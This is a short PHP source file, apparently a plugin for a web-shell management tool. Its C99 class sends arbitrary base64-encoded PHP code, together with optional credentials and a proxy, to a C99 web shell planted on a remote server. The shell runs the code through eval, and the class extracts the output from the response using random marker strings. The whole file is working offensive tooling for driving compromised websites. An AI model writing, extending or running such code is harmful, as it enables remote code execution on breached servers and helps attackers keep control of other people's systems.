<?php
/**
* C99
*/
class C99 extends BasicShell
{
	private $lasterror;
	public function exec($url, $code, $data, $password, $login) {
		$str_start=AMUtil::randomString();
		$str_end=AMUtil::randomString();
		$eval_sub='eval(base64_decode($_POST["debug_value_fgtr"]));';
		$eval_sub="echo('".substr($str_start,0,4)."'.'".substr($str_start,4,4)."');".$eval_sub."die('".substr($str_end,0,4)."'.'".substr($str_end,4,4)."');";

		$post='act=eval&eval='.urlencode($eval_sub).'&d=.%2F&eval_txt=1&debug_value_fgtr='.urlencode(base64_encode($code));

		if(!empty($password) && !empty($login)){
			$headers=array('Authorization: Basic '.base64_encode($login.':'.$password));
		}else{
			$headers=array();
		}
		$headers[]='Content-type: application/x-www-form-urlencoded';

		$opts = array('http' =>
			array(
				'method'  => 'POST',
				'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
				'header'  => implode(PHP_EOL, $headers),
	            'timeout' => $timeout,
				'content' => $post
			)
		);
		//print_r($opts);
		$context  = stream_context_create($opts);
		$response=@file_get_contents($url, false, $context);
		$response=strstr($response, $str_start);
		$response=str_replace(array($str_end, $str_start), "", $response);
		return $response;
	}
}
$shellManager->add("c99", new C99());
?>